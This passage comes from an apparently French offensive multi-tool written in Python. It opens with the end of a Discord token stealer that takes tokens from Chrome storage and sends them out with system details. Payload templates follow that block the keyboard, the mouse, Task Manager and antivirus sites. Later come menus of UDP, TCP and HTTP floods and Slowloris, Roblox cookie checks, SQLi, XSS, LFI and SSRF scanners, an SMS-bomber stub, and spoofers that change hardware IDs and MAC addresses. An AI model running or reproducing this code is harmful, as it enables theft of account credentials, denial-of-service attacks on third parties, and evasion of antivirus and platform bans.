          os.path.join(lo, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")]
    pat = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
    found = []
    for p in ps:
        if not os.path.isdir(p): continue
        for fn in os.listdir(p):
            if not fn.endswith((".log", ".ldb")): continue
            try:
                for tok in pat.findall(open(os.path.join(p, fn), errors="ignore").read()):
                    if tok in [t["token"] for t in found]: continue
                    r = requests.get("https://discord.com/api/v9/users/@me",
                                     headers={"Authorization": tok}, timeout=3)
                    if r.status_code == 200:
                        u = r.json()
                        found.append({"token": tok, "username": u.get("username"),
                                      "email": u.get("email", "N/A")})
            except: pass
    return found
def main():
    i = info(); t = tokens()
    ts = "".join(f"**{x['username']}** | {x['email']}\\n`{x['token']}`\\n" for x in t[:5])
    send(e=[{"title": "leak-fr stealer", "color": 0xFF0000, "fields": [
        {"name": "System", "value": f"```{json.dumps(i, indent=2)[:900]}```"},
        {"name": "Tokens", "value": ts[:1000] or "None"}]}])
main()
'''

_BLOCK_KEY = '''import ctypes, ctypes.wintypes as wt
u = ctypes.WinDLL("user32", use_last_error=True)
WH = 13
def h(n, w, l): return 1
P = ctypes.CFUNCTYPE(ctypes.c_long, ctypes.c_int, wt.WPARAM, wt.LPARAM)
hp = P(h)
u.SetWindowsHookExW(WH, hp, None, 0)
m = wt.MSG()
while u.GetMessageW(ctypes.byref(m), None, 0, 0) != 0:
    u.TranslateMessage(ctypes.byref(m)); u.DispatchMessageW(ctypes.byref(m))
'''

_BLOCK_MOUSE = '''import ctypes, time
u = ctypes.windll.user32
cx, cy = u.GetSystemMetrics(0)//2, u.GetSystemMetrics(1)//2
while True:
    u.SetCursorPos(cx, cy); time.sleep(0.01)
'''

_BLOCK_TM = '''import winreg
k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
winreg.CloseKey(k)
'''

_BLOCK_AV = '''import platform
if platform.system() != "Windows": exit()
for s in ["virustotal.com","malwarebytes.com","avast.com","avg.com","norton.com"]:
    try:
        with open(r"C:\\Windows\\System32\\drivers\\etc\\hosts", "a") as f:
            f.write(f"\\n127.0.0.1 {s}\\n127.0.0.1 www.{s}")
    except: pass
'''

_ANTIVM = '''import os, platform, sys, subprocess, socket
f = []
if platform.processor() == "": f.append("cpu")
if any(b in socket.gethostname().lower() for b in ["sandbox","virus","vmware"]): f.append("host")
if platform.system() == "Windows":
    try:
        out = subprocess.run(["tasklist"], capture_output=True, text=True).stdout.lower()
        for p in ["wireshark","procmon","x64dbg","ida"]:
            if p in out: f.append(p)
    except: pass
if f: print(f"VM: {f}"); sys.exit(0)
print("Clean.")
'''


# ========================================================================
# DDOS
# ========================================================================
def d_udp():
    banner_s("UDP FLOOD")
    h = ask("Target:"); p = ask_int("Port:", 80); d = ask_int("Duration:", 10)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = random._urandom(1024)
    e = time.time() + d; c = 0
    try:
        while time.time() < e:
            s.sendto(pl, (h, p)); c += 1
            if c % 1000 == 0: print(f"  {G}[~]{RST} {c}")
    except KeyboardInterrupt: pass
    s.close(); print(f"\n{OK} {c}."); pause()


def d_tcp():
    banner_s("TCP SYN FLOOD")
    h = ask("Target:"); p = ask_int("Port:", 80); d = ask_int("Duration:", 10)
    e = time.time() + d; c = 0
    try:
        while time.time() < e:
            s = socket.socket(); s.settimeout(0.1); s.connect_ex((h, p)); s.close(); c += 1
            if c % 100 == 0: print(f"  {G}[~]{RST} {c}")
    except KeyboardInterrupt: pass
    print(f"\n{OK} {c}."); pause()


def d_http():
    banner_s("HTTP GET FLOOD")
    url = ask("URL:"); d = ask_int("Duration:", 10); t = ask_int("Threads:", 50)
    stop = {"v": False}; c = [0]
    def fl():
        while not stop["v"]:
            try: requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2); c[0] += 1
            except: pass
    for _ in range(t): threading.Thread(target=fl, daemon=True).start()
    try:
        e = time.time() + d
        while time.time() < e:
            print(f"\r  {G}[~]{RST} {c[0]}", end=" "); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True; print(f"\n\n{OK} {c[0]}."); pause()


def d_slow():
    banner_s("SLOWLORIS")
    h = ask("Host:"); p = ask_int("Port:", 80); n = ask_int("Sockets:", 150)
    s = []
    for _ in range(n):
        try:
            so = socket.socket(); so.settimeout(4); so.connect((h, p))
            so.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\nHost: {h}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
            s.append(so)
        except: pass
    print(f"{OK} {len(s)} sockets."); pause()


def d_udpmt():
    banner_s("UDP MULTI-THREAD")
    h = ask("Target:"); p = ask_int("Port:", 80); d = ask_int("Duration:", 10); t = ask_int("Threads:", 10)
    stop = {"v": False}; c = [0]
    def fl():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = random._urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, p)); c[0] += 1
            except: pass
    for _ in range(t): threading.Thread(target=fl, daemon=True).start()
    try:
        e = time.time() + d
        while time.time() < e:
            print(f"\r  {G}[~]{RST} {c[0]}", end=" "); time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True; print(f"\n\n{OK} {c[0]}."); pause()


def d_mixed():
    banner_s("MIXED FLOOD")
    h = ask("Target:"); d = ask_int("Duration:", 15)
    stop = {"v": False}; c = {"udp": 0, "tcp": 0, "http": 0}
    def fu():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); pl = random._urandom(1024)
        while not stop["v"]:
            try: s.sendto(pl, (h, random.randint(1, 65535))); c["udp"] += 1
            except: pass
    def ft():
        while not stop["v"]:
            try:
                s = socket.socket(); s.settimeout(0.1)
                s.connect_ex((h, random.randint(1, 65535))); s.close(); c["tcp"] += 1
            except: pass
    def fh():
        while not stop["v"]:
            try:
                for port in [80, 443]: requests.get(f"http://{h}:{port}", timeout=1); c["http"] += 1
            except: pass
    for _ in range(5):
        for fn in [fu, ft, fh]: threading.Thread(target=fn, daemon=True).start()
    try:
        e = time.time() + d
        while time.time() < e:
            print(f"\r  {G}[~]{RST} UDP:{c['udp']} TCP:{c['tcp']} HTTP:{c['http']}", end=" ")
            time.sleep(0.5)
    except KeyboardInterrupt: pass
    stop["v"] = True; print(f"\n\n{OK} {sum(c.values())}."); pause()


def ddos_menu():
    while True:
        menu_box("DDOS / STRESSER", [
            ("1", "UDP Flood"), ("2", "TCP SYN Flood"),
            ("3", "HTTP GET Flood"), ("4", "Slowloris"),
            ("5", "Multi-thread UDP"), ("6", "Mixed Flood"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": d_udp()
        elif c == "2": d_tcp()
        elif c == "3": d_http()
        elif c == "4": d_slow()
        elif c == "5": d_udpmt()
        elif c == "6": d_mixed()
        elif c == "0": break


# ========================================================================
# ROBLOX
# ========================================================================
def rb_cookie():
    banner_s("COOKIE INFO")
    ck = ask(".ROBLOSECURITY:")
    h = {"Cookie": f".ROBLOSECURITY={ck}"}
    r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h)
    if r.status_code != 200: print(f"{ERR} Invalide."); pause(); return
    d = r.json(); uid = d.get("id")
    rb = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h).json()
    fr = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", headers=h).json()
    pr = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=h)
    print(f"\n  {Y}Username{RST}: {d.get('name')}")
    print(f"  {Y}ID      {RST}: {uid}")
    print(f"  {Y}Robux   {RST}: {rb.get('robux', '?')}")
    print(f"  {Y}Friends {RST}: {fr.get('count', '?')}")
    print(f"  {Y}Premium {RST}: {pr.status_code == 200}")
    pause()


def rb_name():
    banner_s("USER BY NAME")
    u = ask("Username:")
    r = requests.post("https://users.roblox.com/v1/usernames/users",
                      json={"usernames": [u], "excludeBannedUsers": False}).json()
    if r.get("data"): _rb_p(r["data"][0]["id"])
    else: print(f"{ERR} Not found.")
    pause()


def rb_id():
    banner_s("USER BY ID")
    _rb_p(ask("ID:")); pause()


def _rb_p(uid):
    r = requests.get(f"https://users.roblox.com/v1/users/{uid}").json()
    fr = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count").json()
    for k in ["id", "name", "displayName", "created", "isBanned"]:
        print(f"  {Y}{k:<12}{RST} {W}{r.get(k)}{RST}")
    print(f"  {Y}Friends     {RST} {W}{fr.get('count', '?')}{RST}")


def rb_game():
    banner_s("GAME INFO")
    g = ask("Universe ID:")
    r = requests.get(f"https://games.roblox.com/v1/games?universeIds={g}").json()
    if r.get("data"):
        for k in ["name", "playing", "visits", "maxPlayers", "favoritedCount"]:
            print(f"  {Y}{k:<14}{RST} {W}{r['data'][0].get(k)}{RST}")
    pause()


def rb_search():
    banner_s("SEARCH")
    q = ask("Query:")
    r = requests.get(f"https://users.roblox.com/v1/users/search?keyword={q}&limit=25").json()
    if r.get("data"):
        for u in r["data"]: print(f"  {G}->{RST} {u['name']:<20} {DIM}{u['id']}{RST}")
    pause()


def rb_group():
    banner_s("GROUP")
    r = requests.get(f"https://groups.roblox.com/v1/groups/{ask('ID:')}").json()
    for k in ["name", "memberCount", "publicEntryAllowed"]:
        print(f"  {Y}{k:<20}{RST} {W}{r.get(k)}{RST}")
    pause()


def rb_avatar():
    banner_s("AVATAR")
    uid = ask("User ID:")
    r = requests.get(f"https://avatar.roblox.com/v1/users/{uid}/avatar").json()
    if r.get("scales"):
        for k, v in r["scales"].items(): print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
    pause()


def roblox_menu():
    while True:
        menu_box("ROBLOX TOOLS", [
            ("1", "Cookie Info"), ("2", "User by Username"),
            ("3", "User by ID"), ("4", "Game Info"),
            ("5", "Search Users"), ("6", "Group Info"),
            ("7", "Avatar Info"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": rb_cookie()
        elif c == "2": rb_name()
        elif c == "3": rb_id()
        elif c == "4": rb_game()
        elif c == "5": rb_search()
        elif c == "6": rb_group()
        elif c == "7": rb_avatar()
        elif c == "0": break


# ========================================================================
# WEB TOOLS
# ========================================================================
def w_tech():
    banner_s("TECH DETECTOR")
    url = ask("URL:")
    try:
        r = requests.get(url, timeout=8); t = r.text.lower(); h = r.headers
        for n, d in {"WordPress": "wp-content" in t, "Joomla": "joomla" in t,
                     "Drupal": "drupal" in t, "React": "react" in t,
                     "jQuery": "jquery" in t, "PHP": "PHP" in h.get("X-Powered-By", ""),
                     "Nginx": "nginx" in h.get("Server", "").lower(),
                     "Cloudflare": "cloudflare" in h.get("Server", "").lower()}.items():
            print(f"  {G if d else DIM}[{'X' if d else ' '}]{RST} {n}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def w_cms():
    banner_s("CMS DETECTOR")
    url = ask("URL:").rstrip("/")
    for c, paths in {"WordPress": ["/wp-login.php", "/wp-admin/"],
                     "Joomla": ["/administrator/"],
                     "Drupal": ["/user/login"]}.items():
        for p in paths:
            try:
                r = requests.get(url + p, timeout=4)
                if r.status_code in [200, 301, 302]: print(f"  {G}[FOUND]{RST} {c}"); break
            except: pass
    pause()


def w_admin():
    banner_s("ADMIN FINDER")
    url = ask("URL:").rstrip("/")
    for p in ["/admin", "/administrator", "/wp-admin", "/panel", "/login", "/backend", "/cpanel"]:
        try:
            r = requests.get(url + p, timeout=4)
            if r.status_code in [200, 301, 302]: print(f"  {G}[{r.status_code}]{RST} {url+p}")
        except: pass
    pause()


def w_dir():
    banner_s("DIR BRUTE")
    url = ask("URL:").rstrip("/")
    for p in ["backup", "config", "admin", ".git", ".env", "test", "dev", "uploads", "files"]:
        try:
            r = requests.get(f"{url}/{p}", timeout=3)
            if r.status_code in [200, 301, 302, 403]: print(f"  {Y}[{r.status_code}]{RST} {url}/{p}")
        except: pass
    pause()


def w_sqli():
    banner_s("SQLI SCANNER")
    url = ask("URL:")
    for pl in ["'", "' OR '1'='1", "' OR 1=1--", "1 UNION SELECT NULL--"]:
        try:
            r = requests.get(url + pl, timeout=5)
            if any(e in r.text.lower() for e in ["sql syntax", "mysql_fetch", "syntax error"]):
                print(f"  {R}[VULN]{RST} {pl}")
        except: pass
    pause()


def w_xss():
    banner_s("XSS SCANNER")
    url = ask("URL:")
    for pl in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
               "<svg onload=alert(1)>"]:
        try:
            r = requests.get(url + pl, timeout=6)
            if pl.lower() in r.text.lower(): print(f"  {R}[REFLECTED]{RST} {pl[:40]}")
        except: pass
    pause()


def w_jwt():
    banner_s("JWT ANALYZER")
    t = ask("JWT:")
    p = t.split(".")
    if len(p) == 3:
        try:
            def dp(x):
                x += "=" * ((4 - len(x) % 4) % 4)
                return json.loads(base64.urlsafe_b64decode(x).decode())
            print(f"\n  {Y}Header{RST}:"); pkv(dp(p[0]), 1)
            print(f"\n  {Y}Payload{RST}:"); pkv(dp(p[1]), 1)
        except Exception as e: print(f"{ERR} {e}")
    pause()


def w_waf():
    banner_s("WAF DETECTOR")
    url = ask("URL:")
    try:
        r = requests.get(url, timeout=6); h = str(r.headers).lower()
        for w, s in {"Cloudflare": "cf-ray", "AWS": "x-amzn", "Akamai": "akamai",
                     "Sucuri": "sucuri", "Fastly": "x-fastly"}.items():
            if s in h: print(f"  {R}[WAF]{RST} {w}")
    except: pass
    pause()


def w_short():
    banner_s("URL SHORTENER")
    url = ask("URL:")
    try:
        r = requests.get(f"http://tinyurl.com/api-create.php?url={url}", timeout=8)
        print(f"\n{OK} {G}{r.text}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def w_paste():
    banner_s("PASTEBIN POSTER")
    c = ask("Content or file:")
    if os.path.isfile(c): c = open(c, encoding="utf-8", errors="ignore").read()
    try:
        r = requests.post("https://paste.rs/", data=c.encode(), timeout=8)
        print(f"\n{OK} {G}{r.text.strip()}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def w_lfi():
    banner_s("LFI SCANNER")
    url = ask("URL with ?file=")
    for pl in ["../../../etc/passwd", "../../../../etc/passwd", "/etc/passwd",
               "....//....//....//etc/passwd"]:
        try:
            r = requests.get(url + pl, timeout=5)
            if "root:x:" in r.text: print(f"  {R}[LFI]{RST} {pl}")
        except: pass
    pause()


def w_ssrf():
    banner_s("SSRF SCANNER")
    url = ask("URL with ?url=")
    for pl in ["http://127.0.0.1/", "http://169.254.169.254/latest/meta-data/",
               "file:///etc/passwd", "http://localhost/"]:
        try:
            r = requests.get(url + pl, timeout=5)
            if any(s in r.text for s in ["root:x:", "ami-", "localhost"]):
                print(f"  {R}[SSRF]{RST} {pl}")
        except: pass
    pause()


def w_vuln():
    banner_s("VULN SCANNER")
    url = ask("URL:").rstrip("/")
    try:
        r = requests.get(url, timeout=6)
        for h, m in {"Strict-Transport-Security": "HSTS missing",
                     "X-Frame-Options": "Clickjacking",
                     "Content-Security-Policy": "No CSP",
                     "X-Content-Type-Options": "MIME sniff"}.items():
            if h not in r.headers: print(f"  {Y}[WARN]{RST} {m}")
    except: pass
    for p in ["/.git/config", "/.env", "/wp-config.php", "/backup.zip",
              "/dump.sql", "/phpinfo.php"]:
        try:
            r = requests.get(url + p, timeout=3)
            if r.status_code == 200 and len(r.text) > 10:
                print(f"  {R}[EXPOSED]{RST} {url+p}")
        except: pass
    pause()


def w_sub_takeover():
    banner_s("SUBDOMAIN TAKEOVER")
    d = ask("Domain:")
    for s in ["www", "mail", "dev", "test", "api", "cdn", "blog", "shop"]:
        fqdn = f"{s}.{d}"
        try:
            ip = socket.gethostbyname(fqdn)
            print(f"  {DIM}[{ip}] {fqdn}{RST}")
        except: print(f"  {DIM}[NX]{RST} {fqdn}")
    pause()


def w_js():
    banner_s("JS SECRET EXTRACTOR")
    url = ask("URL:")
    pats = {"API Key": r'api[_-]?key["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{16,64})',
            "Google API": r'AIza[0-9A-Za-z\-_]{35}',
            "Discord Token": r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}',
            "AWS": r'AKIA[0-9A-Z]{16}',
            "JWT": r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'}
    try:
        r = requests.get(url, timeout=8)
        for n, pat in pats.items():
            for m in re.findall(pat, r.text):
                print(f"  {R}[{n}]{RST} {Y}{m[:80]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def web_menu():
    while True:
        menu_box("WEB TOOLS", [
            ("1", "Tech Detector"), ("2", "CMS Detector"),
            ("3", "Admin Finder"), ("4", "Directory Brute"),
            ("5", "SQLi Scanner"), ("6", "XSS Scanner"),
            ("7", "JWT Analyzer"), ("8", "WAF Detector"),
            ("9", "URL Shortener"), ("10", "Pastebin Poster"),
            ("11", "LFI Scanner"), ("12", "SSRF Scanner"),
            ("13", "Vuln Scanner"), ("14", "Subdomain Takeover"),
            ("15", "JS Secret Extractor"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": w_tech()
        elif c == "2": w_cms()
        elif c == "3": w_admin()
        elif c == "4": w_dir()
        elif c == "5": w_sqli()
        elif c == "6": w_xss()
        elif c == "7": w_jwt()
        elif c == "8": w_waf()
        elif c == "9": w_short()
        elif c == "10": w_paste()
        elif c == "11": w_lfi()
        elif c == "12": w_ssrf()
        elif c == "13": w_vuln()
        elif c == "14": w_sub_takeover()
        elif c == "15": w_js()
        elif c == "0": break


# ========================================================================
# CRYPTO
# ========================================================================
def cr_wallet():
    banner_s("WALLET GENERATOR")
    n = ask_int("Count:", 5)
    try: from secrets import token_bytes
    except: import secrets; token_bytes = secrets.token_bytes
    for _ in range(n):
        p = token_bytes(32)
        print(f"  {Y}BTC Address{RST}: 1{base64.b64encode(hashlib.sha256(p).digest()).decode()[:33]}")
        print(f"  {Y}PrivKey   {RST}: {p.hex()}\n")
    pause()


def cr_seed():
    banner_s("SEED PHRASE")
    words = ["abandon", "ability", "able", "about", "above", "absorb", "abstract", "absurd",
             "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
             "acoustic", "acquire", "across", "act", "action", "actor", "actress"]
    for _ in range(ask_int("Count:", 5)):
        print(f"  {G}->{RST} {' '.join(random.choices(words, k=12))}")
    pause()


def cr_prices():
    banner_s("CRYPTO PRICES")
    try:
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,binancecoin,ripple,dogecoin&vs_currencies=usd&include_24hr_change=true", timeout=8).json()
        for k, v in r.items():
            ch = v.get("usd_24h_change", 0)
            col = G if ch >= 0 else R
            print(f"  {Y}{k.upper():<8}{RST} ${v['usd']:>12,.2f}  {col}{ch:+.2f}%{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def cr_valid():
    banner_s("ADDRESS VALIDATOR")
    a = ask("Address:")
    if a.startswith("1") and 25 <= len(a) <= 34: print(f"  {G}[BTC Legacy]{RST}")
    elif a.startswith("3") and 25 <= len(a) <= 34: print(f"  {G}[BTC P2SH]{RST}")
    elif a.startswith("bc1"): print(f"  {G}[BTC SegWit]{RST}")
    elif a.startswith("0x") and len(a) == 42: print(f"  {G}[ETH/EVM]{RST}")
    else: print(f"  {R}[UNKNOWN]{RST}")
    pause()


def cr_vanity():
    banner_s("VANITY HINTS")
    p = ask("Prefix (ex: 1Leak):")
    n = len(p) - 1
    prob = 58 ** n
    print(f"\n  {Y}Diff{RST}: 1 sur {prob:,}")
    print(f"  {DIM}Utilise VanitySearch (GPU){RST}")
    pause()


def cr_tx():
    banner_s("TX LOOKUP")
    print(f"  {Y}[1]{RST}BTC {Y}[2]{RST}ETH {Y}[3]{RST}Wallet")
    c = ask("Type:", "1"); q = ask("Hash/Address:")
    links = []
    if c == "1": links = [f"https://blockchain.info/tx/{q}", f"https://blockchair.com/bitcoin/transaction/{q}"]
    elif c == "2": links = [f"https://etherscan.io/tx/{q}"]
    elif c == "3": links = [f"https://blockchain.info/address/{q}", f"https://etherscan.io/address/{q}"]
    for l in links: print(f"  {G}->{RST} {DIM}{l}{RST}")
    pause()


def crypto_menu():
    while True:
        menu_box("CRYPTO TOOLS", [
            ("1", "Wallet Generator"), ("2", "Seed Phrase (BIP39)"),
            ("3", "Price Checker"), ("4", "Address Validator"),
            ("5", "Vanity Hints"), ("6", "TX Lookup"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": cr_wallet()
        elif c == "2": cr_seed()
        elif c == "3": cr_prices()
        elif c == "4": cr_valid()
        elif c == "5": cr_vanity()
        elif c == "6": cr_tx()
        elif c == "0": break


# ========================================================================
# PHONE
# ========================================================================
def ph_lookup():
    banner_s("NUMBER LOOKUP")
    n = ask("Numero (+cc):")
    for name, url in [("Google", f"https://google.com/search?q=%22{n}%22"),
                      ("Truecaller", f"https://truecaller.com/search/fr/{n.lstrip('+')}"),
                      ("Sync.ME", f"https://sync.me/?q={n.lstrip('+')}"),
                      ("Telegram", f"https://t.me/{n.lstrip('+')}"),
                      ("WhatsApp", f"https://wa.me/{n.lstrip('+')}")]:
        print(f"  {G}[{name}]{RST} {DIM}{url}{RST}")
    pause()


def ph_bomber():
    banner_s("SMS BOMBER")
    n = ask("Numero:"); c = ask_int("Count:", 10)
    for i in range(1, c + 1):
        try:
            requests.post("https://auth.roblox.com/v2/signup",
                          json={"username": f"leakfr{random.randint(1000,9999)}",
                                "password": "LeakFr123!", "birthday": "2000-01-01", "gender": 2},
                          timeout=3)
        except: pass
        print(f"  {Y}[{i}/{c}]{RST}"); time.sleep(0.5)
    pause()


def ph_virt():
    banner_s("VIRTUAL NUMBERS")
    for name, url, p in [("SMS-Activate", "https://sms-activate.org", "~0.10-0.50 EUR"),
                         ("5sim", "https://5sim.net", "~0.10-0.50 USD"),
                         ("SMSPVA", "https://smspva.com", "~0.10-0.30 USD"),
                         ("ReceiveSMS", "https://receivesms.co", "GRATUIT"),
                         ("Temp-Number", "https://temp-number.org", "GRATUIT"),
                         ("Receive-SMSS", "https://receive-smss.com", "GRATUIT")]:
        col = G if "GRATUIT" in p else Y
        print(f"  {col}[{p}]{RST} {name:<16} {DIM}{url}{RST}")
    pause()


def phone_menu():
    while True:
        menu_box("PHONE / SMS", [
            ("1", "Number Lookup"), ("2", "SMS Bomber"),
            ("3", "Virtual Numbers"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": ph_lookup()
        elif c == "2": ph_bomber()
        elif c == "3": ph_virt()
        elif c == "0": break


# ========================================================================
# HWID
# ========================================================================
def hw_show():
    banner_s("MY HWID")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    try:
        import winreg
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        g, _ = winreg.QueryValueEx(k, "MachineGuid"); winreg.CloseKey(k)
        print(f"  {Y}Machine GUID{RST}: {G}{g}{RST}")
    except: pass
    print(f"  {Y}Hostname    {RST}: {G}{platform.node()}{RST}")
    print(f"  {Y}CPU         {RST}: {G}{platform.processor()}{RST}")
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> e) & 0xff) for e in range(0, 48, 8)][::-1])
        print(f"  {Y}MAC         {RST}: {G}{mac}{RST}")
    except: pass
    print(f"  {DIM}Ton HWID licence : {_hwid()[:16]}...{RST}")
    pause()


def hw_fp():
    banner_s("FULL FINGERPRINT")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    def wmi(cls, prop):
        try:
            o = subprocess.run(f'wmic {cls} get {prop} /value', capture_output=True,
                               text=True, shell=True, timeout=8).stdout
            return [l.split("=", 1)[1].strip() for l in o.splitlines() if "=" in l and l.split("=", 1)[1].strip()]
        except: return []
    for lbl, c, p in [("CPU", "cpu", "ProcessorId"), ("BIOS", "bios", "SerialNumber"),
                      ("Baseboard", "baseboard", "SerialNumber"),
                      ("UUID", "csproduct", "UUID"),
                      ("Disk", "diskdrive", "SerialNumber"),
                      ("RAM", "memorychip", "SerialNumber"),
                      ("MAC", "nic", "MACAddress")]:
        for v in wmi(c, p)[:1]: print(f"  {Y}{lbl:<12}{RST} {W}{v}{RST}")
    pause()


def hw_full():
    banner_s("FULL SPOOFER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    if ask("Continuer? (y/n):", "n").lower() != "y": pause(); return
    import winreg, uuid
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "MachineGuid", 0, winreg.REG_SZ, str(uuid.uuid4())); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} Machine GUID")
    except Exception as e: print(f"  {R}[FAIL]{RST} {e}")
    hn = "DESKTOP-" + "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=7))
    try:
        for p in [r"SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName",
                  r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName"]:
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, "ComputerName", 0, winreg.REG_SZ, hn); winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} Hostname -> {hn}")
    except: pass
    try:
        import time
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "InstallDate", 0, winreg.REG_DWORD, int(time.time()) - random.randint(30*86400, 180*86400))
        winreg.CloseKey(k)
        print(f"  {G}[OK]{RST} Install Date random")
    except: pass
    for td in [os.environ.get("TEMP", ""), r"C:\Windows\Prefetch", r"C:\Windows\Temp"]:
        if os.path.isdir(td):
            for f in os.listdir(td):
                try: os.remove(os.path.join(td, f))
                except: pass
    print(f"  {G}[OK]{RST} Temp/Prefetch")
    print(f"\n{R}[!]{RST} Reboot."); pause()


def hw_win():
    banner_s("WINDOWS IDENTITY")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    import uuid
    for n, cmd in [
        ("MachineGUID", f'reg add "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid /t REG_SZ /d "{uuid.uuid4()}" /f'),
        ("ProductId", f'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductId /t REG_SZ /d "{random.randint(10000,99999)}-{random.randint(10000,99999)}" /f'),
        ("SQMClientID", f'reg add "HKLM\\SOFTWARE\\Microsoft\\SQMClient" /v MachineId /t REG_SZ /d "{{{uuid.uuid4()}}}" /f'),
    ]:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(f"  {G if r.returncode == 0 else R}[{'OK' if r.returncode == 0 else 'FAIL'}]{RST} {n}")
    pause()


def hw_rand():
    banner_s("RANDOM HWID")
    import uuid
    print(f"\n  {Y}MachineGUID   {RST}: {str(uuid.uuid4()).upper()}")
    print(f"  {Y}MAC           {RST}: {':'.join(f'{random.randint(0,255):02X}' for _ in range(6))}")
    print(f"  {Y}Disk Serial   {RST}: {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=20))}")
    print(f"  {Y}BIOS Serial   {RST}: {''.join(random.choices('0123456789', k=12))}")
    print(f"  {Y}Hostname      {RST}: DESKTOP-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=7))}")
    print(f"  {Y}Product ID    {RST}: {random.randint(10000,99999)}-{random.randint(10000,99999)}")
    pause()


def hw_disk():
    banner_s("DISK SERIAL SPOOFER")
    print(f"  {DIM}Telecharge VolumeID (Sysinternals){RST}")
    print(f"  {G}volumeid C: {random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}{RST}")
    print(f"  {G}volumeid D: {random.randint(0x1000, 0xFFFF):04X}-{random.randint(0x1000, 0xFFFF):04X}{RST}")
    pause()


def hw_mac():
    banner_s("MAC SPOOFER")
    if platform.system() != "Windows": print(f"{ERR} Windows only."); pause(); return
    try:
        o = subprocess.run(["getmac", "/v", "/fo", "list"], capture_output=True, text=True).stdout
        print(f"{DIM}{o[:600]}{RST}")
    except: pass
    iface = ask("Interface (Ethernet/Wi-Fi):")
    new_mac = "".join(f"{random.randint(0,255):02X}" for _ in range(6))
    print(f"\n  {Y}New MAC{RST}: {G}{':'.join(new_mac[i:i+2] for i in range(0,12,2))}{RST}")
    if ask("Appliquer? (y/n):", "n").lower() == "y":
        try:
            import winreg
            subprocess.run(["netsh", "interface", "set", "interface", iface, "disable"], capture_output=True)
            time.sleep(1)
            nk = r"SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, nk)
            for i in range(winreg.QueryInfoKey(k)[0]):
                try:
                    sub = winreg.EnumKey(k, i)
                    sk = winreg.OpenKey(k, sub, 0, winreg.KEY_ALL_ACCESS)
                    try:
                        desc, _ = winreg.QueryValueEx(sk, "DriverDesc")
                        if iface.lower() in desc.lower():
                            winreg.SetValueEx(sk, "NetworkAddress", 0, winreg.REG_SZ, new_mac)
                            print(f"  {G}[OK]{RST} {desc}")
                    except: pass
